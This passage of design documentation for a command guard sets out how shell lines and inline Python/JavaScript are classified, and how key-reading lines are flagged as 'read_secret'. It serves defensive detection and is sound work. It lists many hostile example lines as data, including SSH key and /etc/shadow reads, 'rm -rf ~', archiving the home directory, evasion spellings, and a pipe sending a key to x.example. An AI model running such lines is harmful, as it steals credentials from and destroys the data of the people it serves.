| Reads | `open(path)` with a mode that reads, `os.open` with `O_RDONLY`, `Path.read_text`, `read_bytes`, `Path.open()`, `shutil.copy*`/`unpack_archive` and `Path.copy` (the source), `shutil.copytree` and `shutil.make_archive` (the folder, and all that is in it: `root_dir` joined to `base_dir`), `TarFile.add` (a file, or a folder and all in it) and `ZipFile.write` (on a name the code set to `tarfile.open(…)`, `tarfile.TarFile(…)` or `zipfile.ZipFile(…)`, as `with … as t` or `t = …`, or called on the spot), `fileinput.input` and `FileInput` (not in place; the files given), `linecache.getline`/`getlines`, `ConfigParser.read` (on a name set to `ConfigParser()`, `RawConfigParser()`; a path or a list), `netrc.netrc` (the file, or `~/.netrc` when none is given) | `fs.readFileSync`, `readFile`, `createReadStream`, `openSync` with reading flags, `copyFileSync`/`cpSync` (the source), their async and `promises` forms, `Deno.readTextFile`, `readFile`, `Deno.open` |

A read of a path the code gives whole is judged as `cat PATH` is, so it is a
finding only where the path is a secret (see [Reading a key](#reading-a-key));
it adds nothing for any other. A read of a path the guard does not fully know
is `unknown`, unless the part it does know is already a place that holds a key
(see [Inline code that opens a file](#what-is-not-a-finding)). A folder read
all the way down (`TarFile.add`, `copytree`, `make_archive`, and `fs.cp` and
`cpSync`, which copy a folder and all that is in it) is judged as `grep -r` is,
so the home directory, or a folder holding a key, is a read of one, as `tar -cf
k.tar ~` is. `Bun.file(path)` is a handle on the file, which `.text()`,
`.stream()` and the rest read, and which `Bun.write` copies from, so it is read
where it is made. `add`, `write` and `read` are read only on a name the code
set to an archive or a config parser: any other object has those methods
(`set.add`, `file.write`, `file.read`). `.open()` of a `pathlib` path (`Path(…)`,
a name set to one, what `/`, `joinpath` and `.parent` make of one) opens the
file it names, also when its value is not known, and reads it only for a mode
that is a string literal that reads (or none): a mode that is a value only known
when it runs, an expression, a name, `mode=` of one, or `*args` or `**kwargs`
that may carry one (`Path(p).open(sys.argv[1])`, `.open('r' + '+')`) is a write
of the path, as the builtin `open` is; the `open` of any other object is not
known to open a file.

**A call the reader does not know.** Code that calls something the reader has
no row for may read, write or delete a file, or run anything
(`invoke.run('rm -rf ~')`, `numpy.fromfile('~/.ssh/id_rsa')`, `pandas.read_csv(…)`,
`fetch('https://…')`, `logging.basicConfig(filename='~/.zshrc')`,
`foo.rm_rf('~')`, `new (require('sqlite3').Database)('x.db')`, `Path('~').rmtree()`,
`os.foo()`), so a call (or a `new`, or a decorator that is no call, `@foo.bar`)
is `unknown` unless it is on an explicit list of calls that touch nothing.
Those are: a builtin that only computes (`print`, `len`, `str`, `dir`,
`parseInt`, `String`, `Map`, `Promise`, `setTimeout`); a function or class the
code defines, whose own calls are read where they are written, and a method it
defines on a value of its own (`obj.run()` with a `def run`); a function of a
module that only looks at a name or computes (`os.path.*`, `os.getcwd`,
`os.listdir`, `os.scandir`, `os.walk`, `os.stat`, `glob.*`, `re.*`, `json.*`,
`math.*`, `time.*`, `datetime.*`, `sys.*`, `console.*`, `path.*`, `JSON.*`,
`Object.*`, `Math.*`, `Date.*`, `process.cwd`, `process.argv`, `os.homedir`,
`fs.existsSync`, `fs.readdirSync`, `fs.statSync`); and a method of a string, a
list, a dictionary, a set, a file object, a regular expression, a promise or a
stream on a value the code made (`startswith`, `split`, `replace`, `join`,
`format`, `get`, `add`, `append`, `items`, `read`, `write`, `then`). A function
of any other module (`copy` of `numpy`, `move` of `turtle`, `open` of `PIL`
and of `webbrowser`), one that a name bound from a module stands for
(`const F = require('foo'); F(…)`, `import x from 'foo'; x(…)`), a method of a
`pathlib` path or any other value it has no row for (`Path(…).rmtree()`, a
name nothing bound, `foo.go()`), a method of a call (`Connection(…).run(…)`),
a function the code is handed (a parameter that is called), and a call of a
call (`f()()`, `x[0]()`) are not on it. A call that is not on the list and is
given a path, a string that is absolute, in the home directory, goes up from
where the code runs (`../`) or is a `file:` URL, or one built from the home
directory, as an argument, a keyword argument, or in a list or a dict that is
one, is judged by the path: `unknown`, with the reason `gives a path to a call
the guard does not read`, or `read_secret` when the path is a key, as for a
read. One given none is `unknown` with the reason `runs code the guard does not
read`. The system's stores of secrets (`keyring`, `keytar`) are `unknown`
whatever they are given.

A literal command string is split in the shell grammar and judged like a
nested `bash -c`; a literal argument list (`subprocess.run(['rm', '-rf',
'~'])`) is judged as the unit it is, `shell=True` or `{ shell: true }` making
it a command line. A `chdir` moves the code's own paths, not the line's.

Each word of the list after the program is read as the path of a read is: a
name the code sets to a string is put back as that string (`f = 'id_rsa'`,
`['cat', '/home/me/.ssh/' + f]`, a `for` over a list of them, one program for
each choice), and the start a word is known to have is the folder it is under,
so a key among them is `read_secret`, as `open(f)` of the same name says. A word
the reader does not know whole (an element of `sys.argv`, the environment,
`input()`, a listing or a loop over one, a `%`, `.format`, a method, a
subscript or a conditional it does not fold) is a word the guard cannot judge,
as `cat "$F"` is: the line is `unknown`, with the reason `runs a program with an
argument only known when the code runs`, unless the unit already found a key in
the part that is known. A spread of an array literal in the list is the words
of that array; any other spread is such a word.

A `chdir` is applied where the code runs it, which is not where it is written
(a function defined before it and called after, a later pass of a loop, an
action registered for when the code ends). So in code that changes directory
anywhere (`os.chdir`, `contextlib.chdir(D)`, `process.chdir`, `Deno.chdir`), each
relative path is judged from every directory the code may be in: where it
started, each `chdir` target, and the places the `chdir`s lead to one after
another. When every target is an absolute folder, or every one is a folder below
the one before (`sub`), those are all the places there are. When they mix, one
goes up with `..` or is only known when it runs, `os.fchdir(fd)` is a directory
only known when it runs, or a nested piece of code (`exec("…")`, `eval("…")`)
has a `chdir` of its own, a relative path is only known when it runs: a read of
one (`open('.ssh/id_rsa')`, `readFileSync`) is `unknown`, as is a program, a
script or nested code run from there (`os.system('cat .ssh/id_rsa')`,
`subprocess.run([…])`, `exec("…")`), and a delete or a write of one is judged
as the shell judges one from a place unknown. A path that is absolute or in the
home directory is the same from anywhere, so a key it names is `read_secret`
as before. The nested
code is read, in its own language and at any depth, not searched for the word:
`getattr(os, 'ch' + 'dir')` and ``process[`ch${'dir'}`]`` are `chdir`s, and code
that cannot be read, or is too long or too deep to, may hold one. In Python a `dir_fd`,
`src_dir_fd` or `dst_dir_fd` makes a path count from a directory handle only
known when it runs, so the path is too.

**Paths.** A literal string; `os.path.expanduser('~…')`, `Path.home()`,
`os.environ['HOME']`, `process.env.HOME`, `os.homedir()` and the like for the
home directory; `os.getcwd()` and `process.cwd()`; `os.path.join`,
`path.join`, `Path(…) / …`, `.joinpath`, `.parent`, `os.path.dirname`, string
`+`, f-strings and template literals made only of those. A `~` at the start of
a path is the home directory wherever it comes in the code, as the shell reads
it (code in a double-quoted argument had `$HOME` put in as `~`, so a literal
tilde cannot be told from it). Anything else, such as a variable or a
computed value, is a path only known when it runs, as `rm -rf "$DIR"` is: a
delete or a write to it is judged as a place unknown, and a read of it is
`unknown`. A read is the one place a name is put back as the string the code
sets it to (see [Reading a key](#what-is-not-a-finding)), and only when the
reader works out every binding of the name whole: a delete or a write to `k` is
still a path only known when it runs, since a name set later or by a loop may be
another. A spread (`os.path.join('/home/me', *parts)`, `Path(*parts)`,
`.joinpath(*parts)`, `path.join(...parts)`, `path.resolve(...parts)`,
`.concat(...parts)`) may add any parts, so the path is only known up to it: a
read of it is `unknown`, or `read_secret` when what comes before the spread is a
folder of keys.

**What stays `unknown`**, with the reason `runs code the guard does not read`
and the code that is the reason as the target: code that does not parse;
`eval`, `exec`, `compile`, `Function`, `vm.*` of anything but a literal string
(a literal is read as code of its language); a library call that runs the code
it is given, `timeit.timeit`/`repeat`/`Timer`, `cProfile.run`/`runctx`,
`profile.run`/`runctx` (a literal is read as Python, a
`lambda` is read where it is written, anything else is code only known when it
runs), and the ones that load code, `pickle` and `marshal` (`load`, `loads`),
`pkgutil.resolve_name`, `importlib.util.module_from_spec`, `exec_module`,
`load_module`, `cProfile.Profile`; every call of `pdb` (`run`, `runeval`,
`runcall`, `main`, `Pdb`), which starts a debugger that reads commands from the
input; `__import__`, `getattr`,
`import()` (awaited or not) and `require` of a computed name, a computed member of `fs` or
`os`; `globals`, `locals`, `vars`, `__dict__`, `__builtins__`, `.constructor`;
an assignment, `setattr`, `Object.defineProperty`, `Object.assign` or
`Reflect.set` to a member of a module, of a name bound to one, of a builtin
class or its `prototype`, of any `__proto__`, or of `process`, `Deno` or `Bun`
(`os.path.join = f`, `path.resolve = f`, `process.cwd = f`,
`String.prototype.concat = f`, `Path.__truediv__ = f`), which changes what the
calls the reader models do (`process.exitCode`, `process.title`,
`module.exports` and a variable of `process.env` that names no directory change
nothing it models);
a call to a name above used as a value (`r = os.remove`,
`map(fs.unlinkSync, files)`, `(0, rm)(p)`, a default value `def f(p,
r=os.remove)`), since the reader cannot follow the alias; a module
(`import`ed, `require`d, or `os`, `sys`, `process`, `globalThis`, `require` and
the like) used anywhere but as the object of an attribute or member
(`os.remove`, `fs.rmSync`), the value of a name it records (`o = os`, `const
fs = require('fs')`, also in a chain or a destructuring), `typeof`, or a
statement of its own: handed to a call (`f(os)`, `(f => f.rmSync(…))(require('fs'))`),
held in a list, a dict or an object, looped over, returned or a default, since
it comes back under a name the reader does not follow; `with (require('fs'))`;
a `{ ...rest }` taken from a module (a default, `{ rmSync = null }`, still
names the member); `sys.modules`; starting a program by `os.exec*`,
`os.spawn*`, `pty.spawn`, `ctypes`; what reads code from the input, `code.interact`,
`breakpoint()` and every `pdb` call in Python, `repl.start`
and `repl.REPLServer` in JavaScript; a session of the `inspector`, which
evaluates what it is sent, and a `cluster` worker, which takes its options from
the settings; the members of node's `module` that load or run code
(`_compile`, `register`, `runMain`, `_load`, `require`, `createRequire`, and
every other member but the plain data `exports`, `paths`, `filename`, `id`,
`children`, `loaded`); the value of a Python `eval` or a JavaScript `eval`
that is used rather than a statement of its own (`eval('os').system(…)`, `r =
eval('require("fs")')`), which may be a module or an object the reader follows
and then comes back under no name (`print(eval('1+2'))` is still safe: the
value goes to `print`); `__import__('os.path')` is `os` unless a non-empty
`fromlist` is given, as Python returns the top package. A command line or code only known when it
runs (`child_process.execSync(process.argv[1])`, an f-string with a
substitution) is `unknown` too. So is a read of a file whose path is not fully
known (`open(sys.argv[1])`, `open(input())`, `open('src/' + n)`), a call it does
not know (see above), and the system's stores of secrets (`keyring`,
`keytar`), each with the reason it gives; a key among them is `read_secret`.
So is code loaded from outside the workspace: an `import`, a dynamic `import()`
or a `require` of a module from the network (an `http:`, `https:`, `jsr:` or
`npm:` specifier, which is also `run_downloaded`), or of a file outside the
workspace (an absolute path, a `file:` URL, `../x.js`), a `fork` of one, and a
`sys.path` entry that is not a workspace folder (`sys.path.insert(0, '/tmp')`,
`append`, `extend`, `sys.path = […]`, `sys.path += […]`), where an `import`
looks for code. A relative `./x.js` and a package (`lodash`, `node:fs`) are the
workspace's own. Code with none of the calls above and nothing it cannot read
is safe: `python3 -c 'print(1+1)'`.

A spread (`spawn(...args)`, `execa('rm', ...rest)`, `new Deno.Command(...args)`)
in a call that starts a program may hold the program, its arguments or its
options, so the call is `unknown`, as `fork`'s is. `cross-spawn` and `execa` are
functions that start a program and have members: only the ones read as calls
are (`spawn`, `sync` of `cross-spawn`, `default`; `execa`, `execaSync`,
`execaCommand`, `command`, `sync` and `$` of `execa`, `sync` of `$`). `call`,
`apply`, `bind` and any other member of one hand the program on to a call the
guard does not see, and are `unknown`, whether reached through a name
(`spawn.call(null, 'rm')`), `require('cross-spawn').call(…)` or `.default`.

**What changes what a call that starts a program does.** `cwd` (`subprocess.run(…,
cwd=DIR)`, `{ cwd: DIR }` for `child_process`, `Deno.Command`, `Bun.spawn`,
`Deno.run`, and `` Bun.$`…`.cwd(DIR) ``) makes the command run after a `cd` to
`DIR`, back where it was after the call, so its relative paths are read from
there; a `cwd` only known when it runs, options that are not an object literal
(`{ ...options }`, `{ [key]: … }`, a variable) or `**options` and `*args` make
the call `unknown`, besides the command read as if there were none. `executable=`
of `subprocess` is the program that runs, with the rest of the list its
arguments (`['x', '-rf', '~'], executable='/bin/rm'` is `rm -rf ~`); with
`shell=True`, or its value only known when it runs, the call is `unknown`.
`child_process`'s `{ shell: 'python3' }` runs that program with `-c LINE`,
which reads the line its own way, so a `shell` that is not `true` or a POSIX
shell is `unknown`. `Bun.$.cwd(…)` and `zx.cd` change the directory of the
calls after them and are `unknown`.

**`child_process`.** `fork(module, args, options)` runs node on a module, a file of the
workspace's own as `node worker.js` is, so it is not read. It is `unknown` when
the module is outside the workspace (`fork('/tmp/x.js')`, `fork('../x.js')`),
only known when it runs or starts with `-` (node reads it as an
option: `fork('-e', ['code'])` runs the code), when the options name the program
(`execPath`) or the options it runs with (`execArgv: ['-e', 'code']`), or when
they are not an object literal that shows what it holds (a variable, a spread, a
computed name, an accessor), and so is a spread in the arguments. The members of
`child_process` the reader does not read (`ChildProcess`, `_forkChild`, any
that is not listed in the table above) are `unknown`, as the unlisted `Sync`
methods are.

Python 2's `exec "code"` (also `exec "code" in globals`) is read like
`exec("code")`: a literal is read as Python, anything else is `unknown`.
`Path.rename` and `Path.replace` take their target as the one argument or as
`target=`; given `*args` or `**kwargs` they are `unknown`, unless on a string
literal, whose `replace` takes two. Python 3.14's `Path.move(target)` and
`Path.move_into(dir)` are read the same way (`move_into` as `mv` into a
folder), and `Path.copy(target, …)` and `Path.copy_into(dir, …)` are a write of
the target, as `shutil.copy` is, from the argument or from `target=` /
`target_dir=`; a `copy` with no target (`d.copy()`) and a method of a module
the code imported (`copy.copy(x)`, `np.copy(a)`, `turtle.move(5)`) are not
this.

`fileinput.input(files, inplace)` and `fileinput.FileInput(files, inplace)`
with `inplace` on rewrite each file, as `sed -i` does, so each file (a string,
or a list or tuple of them) is a write; `inplace` only known when it runs may
be on. Files not given (they come from the script's arguments), given as
anything but a literal string or list, or as `*args`, are only known when it
runs, so the call is `unknown`. `os.kill(pid, sig)`, `os.killpg(pgid, sig)`,
`process.kill(pid, sig)` and `Deno.kill(pid, sig)` are the `kill` command with
that process id when it is a literal (`-1`, `(-1)`, `-0x1`), so `-1` and `1`
are `stop_system` and `0` is not; a process id only known when it runs, a float,
a number with a leading zero or a spread is `unknown`, because it may be any.
`shutil.copymode(src, dst)` and `shutil.copystat(src, dst)` set the permission
bits of `dst` and are a `chmod` of it, as `chmod --reference` is. `execa`'s
`command`, `commandSync` and `$` (called, as a tagged template, and as `$.sync`)
run a command line as `execaCommand` does, and `cross-spawn`'s `spawn` and
`sync` start a program as `child_process.spawn` and `spawnSync` do, and so does
the module itself, called through a name (`const spawn = require('cross-spawn');
spawn(…)`, `import spawn from 'cross-spawn'`) or through its `default`, as
`execa` is. A module handed on as a value is `unknown`.

**Names shared with nested code.** Literal code given to `exec`, `eval` or a
profiler (`cProfile.run`) runs in the namespace of the code around
it, and the reader reads it apart, from a table of names of its own. So a name
the nested code binds (`exec('import shutil as json')`, then `json.rmtree(…)`;
`from shutil import rmtree as f`, `var m = require('fs')`, `var { rm } =
require('fs')`, `global j`, an assignment to a name of the outer code) is a name
the code around it uses and the reader would not follow, and a name the outer
code bound (`import shutil as s`, then `exec("s.rmtree(…)")`) is one the nested
code uses. When the nested code binds a name to what the reader follows (a
module, a call it knows) other than the name stands for in the code around it, or
uses a name that code bound to such a thing, the line is `unknown`. The same is
asked of the code inside the nested code, at any depth, and past the depth that
can be read the answer is yes. A name bound to anything else (`exec('x =
1')`, `eval('var x = 1')`) is not a name the reader follows. What the nested code
does is read all the same.

A key of a destructuring pattern or an import names the member it spells,
however it is written: `{ "rmSync": r }`, `{ ["rmSync"]: r }`, ``{ [`rm${"Sync"}`]: r }``,
`import { "rmSync" as r }`, `{ "promises": { rm } }`. A key only known when it
runs (`{ [k]: r }`), or a string whose escapes the reader does not decode,
taken from a module is `unknown`. A Python name bound more than once to
different things (`import os`, then `if 0: import json as os`; a binding in a
function never called; `o = os`, then `if 0: o = json`) is a name the reader
cannot tell the meaning of, wherever and in whatever order the bindings are
written, when either thing is a module or a call it reads: the line is
`unknown`. The classes
`fs.WriteStream` and `fs.ReadStream` are read as `createWriteStream` and
`createReadStream` (with or without `new`, and destructured). A string, a
template or a concatenation handed as the first argument of `setTimeout` or
`setInterval`, or a spread in its place, is code Deno runs (node and bun throw):
it is not read, and the line is `unknown`.

A JavaScript call to `rmSync`, `unlinkSync`, `writeFileSync`, `execSync`,
`spawnSync` and the like (the methods only the file system and `child_process`
have, with `Sync`) that is not a call the reader can tell, because the object
it is called on cannot be named (`make().rmSync(p)`, `x['unlinkSync'](p)`,
`const r = x.rmSync`), is `unknown`: an alias the reader cannot follow is.

Names are read as the language reads them too. Python reads a name in its NFKC
form (`ｒｅｍｏｖｅ` is `remove`) and JavaScript reads `\u0072mSync` as `rmSync`:
the reader computes neither, so a Python name that is not ASCII and a JavaScript
name written with an escape are `unknown`. A name bound in the body of a Python
class is an attribute of the class (`class C: o = os`, then `C.o.remove(…)`): an
import there, or an assignment of a module or of a call the reader knows, is
`unknown`. Code in a `data:` URL runs where it is written and is not read: an
`import` or `export … from` of one, an `import()` of one, and node's `--import`
and `--loader` of one are `unknown`.

A string's escapes are read as the language reads them: Python's `\n`, `\x41`,
octal and `\u`, JavaScript's, which also takes the legacy octal escapes
(`'\57home\57me'` is `/home/me`, as `node -e` reads it). An escape the reader
does not decode (Python's `\N{NAME}`, a JavaScript surrogate) makes the string
a value only known when it runs, never a guess.

Calls that are not listed are not read, and are `unknown` unless they touch
nothing (see above), so code whose only way to touch a file is one of them (a
logging file handler, a library's own writer) is not safe.
Nested code (`os.system('python3
-c …')`, `exec("…")`) is read to the same depth limit and text budget as
nested scripts. `bun` and `deno` given a `-` (`deno run -`, `bun -`, `bun run
-`) or started as a REPL (`deno`, `deno repl`, `bun repl`) read code from their
input: that is a here-document read as code like `python3 -` and `node -`, and
`unknown` when it comes from a pipe or a file, as for the other interpreters. A script file
and a subcommand (`bun run build.ts`, `deno test`) are the workspace's own.
A line is read in a time that grows with its length: the reader is given each
node's parent as it walks, and works out the dotted name of each member once,
and a piece of code that nests too deeply to read ends the walk with
`unreadable`. Putting a name back as its string, for a read, is bounded too:
a name set to a string built from itself or from another that was (`a1 = a0 +
a0`, repeated, which doubles the string with each line) would otherwise take
seconds and gigabytes from a few hundred bytes. A string worked out from names
is cut at 4 KB (a path is not longer), checked at each step of a join, a
template or a concatenation; the strings noted for all names together are cut
at a few times the length limit; and the paths read out of names are cut at
1,024 for a piece of code. A name that went over any of them is dropped, not
read as any string: a read of it, or of a path worked out from it, is code the
guard does not read (`unknown`), so none of these limits makes a line safe.

## Reading a key

`read_secret` finds a read of a key or a credential. Refused on the file API,
a key can be read through the shell, so the two guards give the same answer
for the same file: `cat <path>` is `read_secret` exactly when the file guard
calls a read of `<path>` one, in the place's own words (`reads your SSH keys`,
`reads the system's password hashes`). `crates/guards/tests/agree.rs` holds
them to it: it takes every path the file guard's tables name, on a POSIX
machine, a Mac and a Windows one, and runs it through `cat` (POSIX),
`Get-Content` (PowerShell) and `type` (cmd).

What is a secret is core's: a place it marks `Secret` (see
[Core](core.md#what-core-judges)), a disk (its bytes hold every key on it,
`reads a disk, and every key on it`), and in a POSIX shell what the kernel
serves, `/proc/self/environ` and `/dev/mem` (`reads the kernel's process
files`, `reads a device file`). Not the repository's history, not a shell
startup file, not a protected path, and not `.env`, which core does not list.

| Line | Rule | Reason |
| --- | --- | --- |
| `cat ~/.ssh/id_ed25519`, `head -c 100 ~/.aws/credentials`, `base64 < ~/.ssh/id_rsa`, `grep key ~/.netrc` | `read_secret` | reads your SSH keys, reads your AWS credentials, reads your saved logins |
| `Get-Content $HOME\.ssh\id_ed25519`, `type %USERPROFILE%\.aws\credentials` | `read_secret` | reads your SSH keys, reads your AWS credentials |
| `sudo cat ~/.ssh/id_ed25519` | `elevated`, `read_secret` | runs as root, reads your SSH keys |
| `cat /etc/shadow`, `cat /proc/self/environ`, `dd if=/dev/sda` | `read_secret` | the place's words |
| `cat .git/config`, `cat ~/.zshrc`, `cat .env`, `cat src/main.rs`, `ls ~/.ssh` | safe | |

### What reads

A line reads a secret when a program the guard knows opens the file's
contents, or a `<` redirect does (with any program, and in cmd too):

- **The operand table of [Reads only](#the-readers).** One table says which
  arguments each reader opens as files, so `effect` and this rule cannot
  disagree about what a line opens: `cat`, `head`, `tail`, `wc`, `less`,
  `sort`, `diff`, `grep`, `egrep`, `fgrep`, `rg` (every operand but the
  pattern, a `-f FILE` too), `git` (what `--no-index`, `blame --contents` and
  the like name, never the folder `-C` names), `Get-Content`, `Select-String`,
  `type`, `findstr`.
- **Programs that are not reads-only but show or pass on what they open**, with
  what their own options take: `more`, `tac`, `nl`, `rev`, `fold`, `paste`,
  `cut`, `uniq`, `comm`, `cmp`, `od`, `xxd`, `hexdump`, `strings`, `base64`,
  `bat`, `awk` and `sed` (after the program), `tar` (every operand but the
  values of `-C` and the like), `gzip` and the other compressors, `zip`, `7z`,
  `gpg`, `openssl` (`-in`, `-inkey`, `-key`), `curl` given a `file://` URL,
  `source`, `dd if=` (`curl file://$HOME/.ssh/id_rsa` too, `$HOME` in it being
  the home directory as in a plain word), PowerShell's `Import-Clixml`, `Import-Csv` and
  `Compress-Archive`, cmd's `more`, `sort`, `find`, `fc` and `certutil`.
- **A copy reads its sources**, whatever it does with them and wherever they
  land: `cp`, `install`, `rsync`, `Copy-Item`, `copy`, `xcopy`, `robocopy`.
  `cp ~/.ssh/id_ed25519 keys/` is a read of the key, and the key now sits
  where it may be committed.
- **A listing piped into a reader.** The stage before a reader hands it
  names, so a stage that lists a folder of keys is a read of them, through any
  stage that only selects or orders: `ls ~/.ssh | xargs cat`, `find ~/.ssh |
  xargs grep key`, `Get-ChildItem ~\.ssh | Get-Content`, and `find ~/.ssh
  -exec cat {} +`. The words of an `echo` or a `printf` are a list too
  (`echo ~/.ssh/id_rsa | xargs cat`, `printf '%s\n' ~/.ssh/id_rsa | xargs cat`,
  PowerShell's `Write-Output`); a word the guard cannot place is no finding.
- **A `for` over words written out** is read with each word in place, as
  `effect` reads it: `for f in ~/.ssh/*; do cat "$f"; done`, also for a `<`
  redirect in the body.
- The wrappers come off, as for every rule (`sudo cat`, `env cat`, `bash -c
  'cat …'`).

A line that only names a file is not a read of it. `ls ~/.ssh`, `stat`, `du`,
`df`, `file`, `realpath`, `test -f`, `find` with no `-exec` and `echo` give
names, sizes and answers about a file, not what is in it, and are safe. A
program that uses a key and does not show it (`ssh -i ~/.ssh/id_ed25519 host`,
`ssh-add`, `git -C ~/.ssh`) is safe too. A program that sends a file off the
machine (`curl -d @key`, `scp`) is not this rule's. This rule reports what a
line reads and a rule of its own, `SendSecret`, reports what leaves, so one
reads and the other sends, and a line can be both: `cat ~/.ssh/id_ed25519 |
curl -d @- https://x.example` is `read_secret` for the `cat`.

### The spelling of the file

The file is judged by what it resolves to, as for every rule: `~`, `$HOME`,
`${HOME}`, `..`, doubled separators, case (on every host), a Windows short
name, a long path, a device path, a Mac's links to the root, another user's
home, all by [core](core.md). The shell's syntax adds:

- A brace list is spelled out first: `cat ~/.ssh/{id_rsa,x}` and
  `cp ~/.ssh/id_{rsa,ed25519} /tmp` read `~/.ssh/id_rsa`; a list that makes
  more than 256 words is read as a file known only when the line runs.
- A POSIX wildcard part that can match `..` (`.*`, `.?`, `.[.]`, `.[!a]`)
  stands for `.` and `..` as well as the names it picks, since bash 3.2 (macOS's
  `/bin/sh`) and dash match them and the guard cannot know which shell runs
  the line: `cat .*/.*/.ssh/id_rsa` from `~/work/repo` reads `~/.ssh/id_rsa`.
  A folder read all the way down is read so too: from `~/work`, `grep -r x .*`
  reads the home directory and its keys, as `grep -r x ..` does. Core does
  this for every rule that resolves a pattern (`Resolver::places` gives each
  reading), so `rm -rf
  .*/.*/.agent` is judged against the parent as well. `cat .*rc` cannot match
  `..` and is not read that way. PowerShell and cmd wildcards are not.
- A wildcard picks what it can match, as for a protected path:
  `cat ~/.s*/id_rsa`, `cat /etc/sh*dow` and `cat /home/*/.ssh/id_rsa` read a
  key. `cat ~/*` does not, in a POSIX shell, since `*` does not match `.ssh`
  (unless the line turns `dotglob` on); `Get-Content ~\*` does, since a
  PowerShell wildcard matches a leading dot. `cat ~/.*` reads every dot file
  in the home directory, which includes `.netrc`.
- `~alice/.ssh/id_rsa` is read as `/home/alice/.ssh/id_rsa` and
  `/Users/alice/.ssh/id_rsa`, and `~root` also as `/root` and `/var/root`.
- A word that only ends in something known when the line runs lands in the
  folder before it: `cat ~/.ssh/$f` and `cat /proc/$$/environ` are reads
  (`$f` could be `../..`: an accepted false alarm).
- A PowerShell word that is a variable and a path (`$HOME\.ssh\id_rsa`,
  `$env:USERPROFILE/.aws`) is read as the expandable string it is. The grammar
  reads it as a member access and loses the path, so the guard puts it in
  double quotes before it reads the line.
- An ANSI-C string is a value known when the line is read, so it is read:
  `cat $'\x2f'home/me/.ssh/id_rsa` and `cat ~/.ssh/$'id_rsa'` read the key. A
  `~` it makes is a plain character, as it is in a quoted word of the
  shell: `cat $'\x7e'/.ssh/id_rsa` names a folder called `~` and is not a
  finding. `$HOME`, `${HOME}`, `$PWD` and `$TMPDIR` in such a word, or in a brace
  list, are the places they name unless the line sets them.
- PowerShell's `. FILE` and `& FILE`, and a file given as the program
  (`. $HOME/.ssh/id_ed25519`), read what is in the file.
- A `<` redirect has the same spellings. `exec 3< ~/.ssh/id_rsa` and
  `x=$(< ~/.ssh/id_rsa)` read the key. In cmd the target is read as cmd reads
  it, with its quotes off: `more < "%USERPROFILE%\.ssh\id_rsa"` is the key.

### A folder read all the way down

A program that goes through every folder below the one it is given holds the
keys in it when it is given the home directory, a folder holding it, or the
root of a disk: `grep -r BEGIN ~`, `rg token ~` (`rg` skips hidden entries by
default, and is read as if it did not), `cp -r ~ /tmp/b`, `rsync -a ~/ /tmp/b/`,
`tar czf x.tgz ~`, `zip -r x.zip ~`, `diff -r ~ x`, `find ~ -type f -exec cat
{} +`, `find ~ | xargs cat`, cmd's `findstr /s` and `xcopy /s`, PowerShell's
`Copy-Item -Recurse` and `Get-ChildItem -Recurse ~ | Get-Content`. A search
given no place is of the working directory (`cd ~ && rg token`), unless a
pipeline gives it text. The reason says it: `reads your home directory, and the
keys in it`. Another folder that holds a key without being one (`~/.config`,
`/etc`) is not told apart from any other.

### What is not a finding

- **A file known only when the line runs.** `cat $f`, `cat "$(pwd)/x"`, `cat
  "$X/.ssh/id_rsa"`, `cat ~/${NAME}`, `Get-Content
  (Join-Path …)`, a PowerShell string with a variable the guard cannot name, a
  path in a variable the line sets (`k=~/.ssh/id_rsa; cat $k`), and a
  .NET call (`[IO.File]::ReadAllText(…)`). The guard does not guess a value,
  and `classify` flags nothing for it. `effect` already says `Unknown` for each
  (a path known only when it runs is not reads-only), so a caller that only lets
  a line run unasked when it is `ReadsOnly` asks. A reader whose file is known
  and is not a secret is safe, with its own row.
- **A program the guard does not know opens a file.** `jq`, `yq`, `ssh-keygen
  -y -f`, an editor, `column`. The list above is what is known; a program
  outside it is `effect`'s `Unknown`, and a script file is the workspace's own
  code and not read.
- **Inline code that opens a file is a read of it.** Python and JavaScript
  given inline are read (see [Inline code](#inline-code)), and an `open()` in a
  mode that reads, `Path.read_text` and `read_bytes`, `readFileSync`,
  `readFile`, `fs.promises.readFile`, `createReadStream`, `openSync`,
  `Deno.readTextFile`, and the source of `shutil.copy*`, `copytree` and
  `copyFileSync` are judged as `cat <path>` is: `read_secret` exactly when
  the path is a place core marks `Secret`, with the same words. Only a path
  the code gives whole is a path the guard knows: a literal,
  `os.path.expanduser('~/…')`, `Path.home() / …`, `os.homedir() + …`, an
  f-string or template literal made of those, or a name the code sets to one
  of those, or to strings a loop goes over when they are written out (every
  string a name is set to anywhere in the code is read, in any order, up to
  the limits below). A read of any other path fails closed, as a delete of one
  is a place unknown for `rm`: the line is `unknown`, with the reason `opens a
  file whose path is only known when the code runs` and the path as the
  target, unless the part of it the code does give already lies in a place
  that holds a key, which is `read_secret`, as `cat ~/.ssh/$n` is. So a path
  that starts in a key folder and ends in something only known when the code
  runs is `read_secret` (`'/home/me/.ssh/' + n`, `f'…/{n}'`, `'…/%s' % n`
  and `'…/{}'.format(n)`, when the folder comes before the first part that is
  not a literal, `os.path.join(d, n)`, `Path(d) / n`, `d.joinpath(n)`,
  `` `…/${n}` ``, `path.join(d, n)`, `.concat(n)` and `[d, n].join('/')`), and
  every other path not given whole is `unknown`: one with nothing known before
  the part that is not (`open(n + '/x')`), one in a folder that holds no key
  (`open('/etc/' + n)`, `open('src/' + n)`), the home directory with a name
  after it (`~/` and each name `os.listdir` gives, dotfiles among them), a
  path only known when the code runs (`open(sys.argv[1])`, `open(input())`,
  `fileinput.input()` given no files, which reads the ones the line names), a
  string made by a call the reader does not follow (`'…'.strip()`, `[:-1]`,
  `.lower()`, `base64.b64decode(…)`, `chr(47)`, `atob(…)`, `new URL(…)`, a
  function or a lambda that returns it), a name it does not follow (a
  subscript, a dict, an unpacking, an object's member, a walrus), a `%` or a
  `.format` with a part that is not a literal (`'%s/.ssh/id_rsa' % h`, even
  when `h` is the home directory), and a name a loop sets to each path a
  listing gives, whose pattern is not followed (`Path('~').glob('.ssh/*')`,
  `Path.home().rglob('id_rsa')`, `glob.glob('~/.n*')`, `iterdir`, `listdir`,
  `os.walk`, `os.scandir`, `readdirSync`), and a name a loop sets to each of
  anything but a list written out where the loop is (`for k in ks` with `ks`
  a name set to a list, a dict's `values()` or `items()`, `'a b'.split()`, a
  concatenation of lists, `enumerate(…)`, `Object.keys(…).forEach`). Code the
  guard cannot read, a program the code starts and a name it does not follow
  stay `unknown` as above.

  A name that holds more than one string, used in a longer path (`for d in
  ['a', '/home/me/.ssh']: open(d + '/id_rsa')`), makes one read for each
  choice of a string for each such name, as the shell reads a `for` over words
